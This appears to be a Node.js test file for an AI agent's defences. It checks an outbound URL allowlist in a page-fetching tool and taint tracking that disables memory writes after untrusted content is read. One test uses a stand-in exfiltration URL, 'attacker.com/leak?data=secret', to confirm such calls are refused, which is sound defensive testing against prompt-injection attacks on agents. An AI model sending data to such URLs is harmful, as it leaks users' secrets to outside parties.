import test from 'node:test';
import assert from 'node:assert/strict';

// Test 1: Verify outbound allowlist security in fetch_page (§7.3)
test('fetch_page rejects non-allowlisted URLs to prevent query exfiltration', async () => {
  const { fetchPageTool } = await import('../src/lib/agent/tools/fetch_page.ts');
  const allowedUrls = new Set(['https://fastify.dev/docs/']);

  const ctx = {
    runId: 'test_run_1',
    userId: 'test_user',
    isTainted: false,
    allowedUrls,
  };

  // Malicious URL not on allowlist
  const attackResult = await fetchPageTool.execute({ url: 'https://attacker.com/leak?data=secret' }, ctx);
  assert.equal(attackResult.ok, false);
  assert.equal(attackResult.error, 'REFUSED');
  assert.match(attackResult.message, /outbound allowlist/i);

  // Allowlisted URL succeeds or connects
  const validAllowed = ctx.allowedUrls.has('https://fastify.dev/docs/');
  assert.equal(validAllowed, true);
});

// Test 2: Verify taint tracking blocks write_memory (§7.3)
test('write_memory is blocked when run is tainted', async () => {
  const { writeMemoryTool } = await import('../src/lib/agent/tools/memory.ts');

  const taintedCtx = {
    runId: 'test_run_2',
    userId: 'test_user',
    isTainted: true, // Marked tainted after reading external untrusted data
    allowedUrls: new Set(),
  };

  const result = await writeMemoryTool.execute({ fact: 'Prefer dark mode' }, taintedCtx);
  assert.equal(result.ok, false);
  assert.equal(result.error, 'REFUSED');
  assert.match(result.message, /disabled because this run has ingested untrusted external content/i);
});

// Test 3: Verify static tool registry and taint filtering
test('getAvailableTools removes write_memory when tainted', async () => {
  const { getAvailableTools } = await import('../src/lib/agent/tools/index.ts');

  const untaintedTools = getAvailableTools(false);
  assert.equal(untaintedTools.some((t) => t.name === 'write_memory'), true);

  const taintedTools = getAvailableTools(true);
  assert.equal(taintedTools.some((t) => t.name === 'write_memory'), false);
});
